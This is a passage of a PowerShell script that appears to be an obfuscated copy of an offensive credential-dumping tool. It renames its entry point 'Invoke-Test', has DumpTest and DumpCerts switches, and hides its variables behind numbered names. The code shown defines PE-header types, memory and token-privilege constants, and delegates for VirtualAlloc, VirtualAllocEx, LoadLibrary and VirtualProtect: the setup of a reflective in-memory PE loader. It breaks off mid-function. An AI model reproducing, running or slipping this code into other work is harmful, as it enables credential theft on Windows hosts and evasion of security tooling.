function Invoke-Test
{
[CmdletBinding(DefaultParameterSetName="DumpTest")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	$ComputerName,
    [Parameter(ParameterSetName = "DumpTest", Position = 1)]
    [Switch]
    $DumpTest,
    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    $DumpCerts,
    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)
Set-StrictMode -Version 2
${3} = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		${2},
        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		${1},
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$FuncReturnType,
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		${17},
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$ProcName,
        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        ${f1}
	)
	Function f37
	{
		$Win32Types = New-Object System.Object
		${176} = [AppDomain]::CurrentDomain
		${290} = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		${174} = ${176}.DefineDynamicAssembly(${290}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		${173} = ${174}.DefineDynamicModule('DynamicModule', $false)
		${276} = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		${170} = ${173}.DefineEnum('MachineType', 'Public', [UInt16])
		${170}.DefineLiteral('Native', [UInt16] 0) | Out-Null
		${170}.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		${170}.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		${170}.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		${289} = ${170}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value ${289}
		${170} = ${173}.DefineEnum('MagicType', 'Public', [UInt16])
		${170}.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		${170}.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		${288} = ${170}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value ${288}
		${170} = ${173}.DefineEnum('SubSystemType', 'Public', [UInt16])
		${170}.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		${170}.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		${170}.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		${170}.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		${170}.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		${170}.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		${170}.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		${170}.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		${170}.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		${170}.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		${170}.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		${287} = ${170}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value ${287}
		${170} = ${173}.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		${170}.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		${170}.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		${170}.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		${170}.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		${170}.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		${170}.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		${170}.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		${170}.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		${170}.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		${170}.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		${170}.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		${170}.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		${170}.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		${286} = ${170}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value ${286}
		${266} = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		${170} = ${173}.DefineType('IMAGE_DATA_DIRECTORY', ${266}, [System.ValueType], 8)
		(${170}.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		(${170}.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		${285} = ${170}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value ${285}
		${266} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		${170} = ${173}.DefineType('IMAGE_FILE_HEADER', ${266}, [System.ValueType], 20)
		${170}.DefineField('Machine', [UInt16], 'Public') | Out-Null
		${170}.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		${170}.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		${170}.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		${170}.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		${170}.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		${170}.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		${282} = ${170}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value ${282}
		${266} = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		${170} = ${173}.DefineType('IMAGE_OPTIONAL_HEADER64', ${266}, [System.ValueType], 240)
		(${170}.DefineField('Magic', ${288}, 'Public')).SetOffset(0) | Out-Null
		(${170}.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		(${170}.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		(${170}.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		(${170}.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		(${170}.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		(${170}.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		(${170}.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		(${170}.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		(${170}.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		(${170}.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		(${170}.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		(${170}.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		(${170}.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		(${170}.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		(${170}.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		(${170}.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		(${170}.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		(${170}.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		(${170}.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		(${170}.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		(${170}.DefineField('Subsystem', ${287}, 'Public')).SetOffset(68) | Out-Null
		(${170}.DefineField('DllCharacteristics', ${286}, 'Public')).SetOffset(70) | Out-Null
		(${170}.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		(${170}.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		(${170}.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		(${170}.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		(${170}.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		(${170}.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		(${170}.DefineField('ExportTable', ${285}, 'Public')).SetOffset(112) | Out-Null
		(${170}.DefineField('ImportTable', ${285}, 'Public')).SetOffset(120) | Out-Null
		(${170}.DefineField('ResourceTable', ${285}, 'Public')).SetOffset(128) | Out-Null
		(${170}.DefineField('ExceptionTable', ${285}, 'Public')).SetOffset(136) | Out-Null
		(${170}.DefineField('CertificateTable', ${285}, 'Public')).SetOffset(144) | Out-Null
		(${170}.DefineField('BaseRelocationTable', ${285}, 'Public')).SetOffset(152) | Out-Null
		(${170}.DefineField('Debug', ${285}, 'Public')).SetOffset(160) | Out-Null
		(${170}.DefineField('Architecture', ${285}, 'Public')).SetOffset(168) | Out-Null
		(${170}.DefineField('GlobalPtr', ${285}, 'Public')).SetOffset(176) | Out-Null
		(${170}.DefineField('TLSTable', ${285}, 'Public')).SetOffset(184) | Out-Null
		(${170}.DefineField('LoadConfigTable', ${285}, 'Public')).SetOffset(192) | Out-Null
		(${170}.DefineField('BoundImport', ${285}, 'Public')).SetOffset(200) | Out-Null
		(${170}.DefineField('IAT', ${285}, 'Public')).SetOffset(208) | Out-Null
		(${170}.DefineField('DelayImportDescriptor', ${285}, 'Public')).SetOffset(216) | Out-Null
		(${170}.DefineField('CLRRuntimeHeader', ${285}, 'Public')).SetOffset(224) | Out-Null
		(${170}.DefineField('Reserved', ${285}, 'Public')).SetOffset(232) | Out-Null
		${284} = ${170}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value ${284}
		${266} = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		${170} = ${173}.DefineType('IMAGE_OPTIONAL_HEADER32', ${266}, [System.ValueType], 224)
		(${170}.DefineField('Magic', ${288}, 'Public')).SetOffset(0) | Out-Null
		(${170}.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		(${170}.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		(${170}.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		(${170}.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		(${170}.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		(${170}.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		(${170}.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		(${170}.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		(${170}.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		(${170}.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		(${170}.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		(${170}.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		(${170}.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		(${170}.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		(${170}.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		(${170}.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		(${170}.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		(${170}.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		(${170}.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		(${170}.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		(${170}.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		(${170}.DefineField('Subsystem', ${287}, 'Public')).SetOffset(68) | Out-Null
		(${170}.DefineField('DllCharacteristics', ${286}, 'Public')).SetOffset(70) | Out-Null
		(${170}.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		(${170}.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		(${170}.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		(${170}.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		(${170}.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		(${170}.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		(${170}.DefineField('ExportTable', ${285}, 'Public')).SetOffset(96) | Out-Null
		(${170}.DefineField('ImportTable', ${285}, 'Public')).SetOffset(104) | Out-Null
		(${170}.DefineField('ResourceTable', ${285}, 'Public')).SetOffset(112) | Out-Null
		(${170}.DefineField('ExceptionTable', ${285}, 'Public')).SetOffset(120) | Out-Null
		(${170}.DefineField('CertificateTable', ${285}, 'Public')).SetOffset(128) | Out-Null
		(${170}.DefineField('BaseRelocationTable', ${285}, 'Public')).SetOffset(136) | Out-Null
		(${170}.DefineField('Debug', ${285}, 'Public')).SetOffset(144) | Out-Null
		(${170}.DefineField('Architecture', ${285}, 'Public')).SetOffset(152) | Out-Null
		(${170}.DefineField('GlobalPtr', ${285}, 'Public')).SetOffset(160) | Out-Null
		(${170}.DefineField('TLSTable', ${285}, 'Public')).SetOffset(168) | Out-Null
		(${170}.DefineField('LoadConfigTable', ${285}, 'Public')).SetOffset(176) | Out-Null
		(${170}.DefineField('BoundImport', ${285}, 'Public')).SetOffset(184) | Out-Null
		(${170}.DefineField('IAT', ${285}, 'Public')).SetOffset(192) | Out-Null
		(${170}.DefineField('DelayImportDescriptor', ${285}, 'Public')).SetOffset(200) | Out-Null
		(${170}.DefineField('CLRRuntimeHeader', ${285}, 'Public')).SetOffset(208) | Out-Null
		(${170}.DefineField('Reserved', ${285}, 'Public')).SetOffset(216) | Out-Null
		${281} = ${170}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value ${281}
		${266} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		${170} = ${173}.DefineType('IMAGE_NT_HEADERS64', ${266}, [System.ValueType], 264)
		${170}.DefineField('Signature', [UInt32], 'Public') | Out-Null
		${170}.DefineField('FileHeader', ${282}, 'Public') | Out-Null
		${170}.DefineField('OptionalHeader', ${284}, 'Public') | Out-Null
		${283} = ${170}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value ${283}
		${266} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		${170} = ${173}.DefineType('IMAGE_NT_HEADERS32', ${266}, [System.ValueType], 248)
		${170}.DefineField('Signature', [UInt32], 'Public') | Out-Null
		${170}.DefineField('FileHeader', ${282}, 'Public') | Out-Null
		${170}.DefineField('OptionalHeader', ${281}, 'Public') | Out-Null
		${280} = ${170}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value ${280}
		${266} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		${170} = ${173}.DefineType('IMAGE_DOS_HEADER', ${266}, [System.ValueType], 64)
		${170}.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		${170}.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		${170}.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		${170}.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		${170}.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		${170}.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		${170}.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		${170}.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		${170}.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		${170}.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		${170}.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		${170}.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		${170}.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		${170}.DefineField('e_ovno', [UInt16], 'Public') | Out-Null
		${279} = ${170}.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		${275} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${274} = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		${272} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${276}, ${275}, ${274}, @([Int32] 4))
		${279}.SetCustomAttribute(${272})
		${170}.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		${170}.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null
		${278} = ${170}.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		${275} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${272} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${276}, ${275}, ${274}, @([Int32] 10))
		${278}.SetCustomAttribute(${272})
		${170}.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		${277} = ${170}.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value ${277}
		${266} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		${170} = ${173}.DefineType('IMAGE_SECTION_HEADER', ${266}, [System.ValueType], 40)
		${273} = ${170}.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		${275} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${272} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${276}, ${275}, ${274}, @([Int32] 8))
		${273}.SetCustomAttribute(${272})
		${170}.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		${170}.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		${170}.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		${170}.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		${170}.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		${170}.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		${170}.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		${170}.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		${170}.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		${271} = ${170}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value ${271}
		${266} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		${170} = ${173}.DefineType('IMAGE_BASE_RELOCATION', ${266}, [System.ValueType], 8)
		${170}.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		${170}.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		${270} = ${170}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value ${270}
		${266} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		${170} = ${173}.DefineType('IMAGE_IMPORT_DESCRIPTOR', ${266}, [System.ValueType], 20)
		${170}.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		${170}.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		${170}.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		${170}.DefineField('Name', [UInt32], 'Public') | Out-Null
		${170}.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		${269} = ${170}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value ${269}
		${266} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		${170} = ${173}.DefineType('IMAGE_EXPORT_DIRECTORY', ${266}, [System.ValueType], 40)
		${170}.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		${170}.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		${170}.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		${170}.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		${170}.DefineField('Name', [UInt32], 'Public') | Out-Null
		${170}.DefineField('Base', [UInt32], 'Public') | Out-Null
		${170}.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		${170}.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		${170}.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		${170}.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		${170}.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		${268} = ${170}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value ${268}
		${266} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		${170} = ${173}.DefineType('LUID', ${266}, [System.ValueType], 8)
		${170}.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		${170}.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		${267} = ${170}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value ${267}
		${266} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		${170} = ${173}.DefineType('LUID_AND_ATTRIBUTES', ${266}, [System.ValueType], 12)
		${170}.DefineField('Luid', ${267}, 'Public') | Out-Null
		${170}.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		${265} = ${170}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value ${265}
		${266} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		${170} = ${173}.DefineType('TOKEN_PRIVILEGES', ${266}, [System.ValueType], 16)
		${170}.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		${170}.DefineField('Privileges', ${265}, 'Public') | Out-Null
		${264} = ${170}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value ${264}
		return $Win32Types
	}
	Function f36
	{
		$Win32Constants = New-Object System.Object
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		return $Win32Constants
	}
	Function f38
	{
		$Win32Functions = New-Object System.Object
		${263} = f53 kernel32.dll VirtualAlloc
		${262} = f33 @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${261} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${263}, ${262})
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value ${261}
		${260} = f53 kernel32.dll VirtualAllocEx
		${259} = f33 @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${258} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${260}, ${259})
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value ${258}
		${257} = f53 msvcrt.dll memcpy
		${256} = f33 @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		${255} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${257}, ${256})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value ${255}
		${254} = f53 msvcrt.dll memset
		${253} = f33 @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		${252} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${254}, ${253})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value ${252}
		${251} = f53 kernel32.dll LoadLibraryA
		${250} = f33 @([String]) ([IntPtr])
		${249} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${251}, ${250})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value ${249}
		${129} = f53 kernel32.dll GetProcAddress
		${248} = f33 @([IntPtr], [String]) ([IntPtr])
		${164} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${129}, ${248})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value ${164}
		${247} = f53 kernel32.dll GetProcAddress
		${246} = f33 @([IntPtr], [IntPtr]) ([IntPtr])
		${245} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${247}, ${246})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value ${245}
		${244} = f53 kernel32.dll VirtualFree
		${243} = f33 @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${242} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${244}, ${243})
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value ${242}
		${241} = f53 kernel32.dll VirtualFreeEx
		${240} = f33 @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${239} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${241}, ${240})
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value ${239}
		${238} = f53 kernel32.dll VirtualProtect
		${237} = f33 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
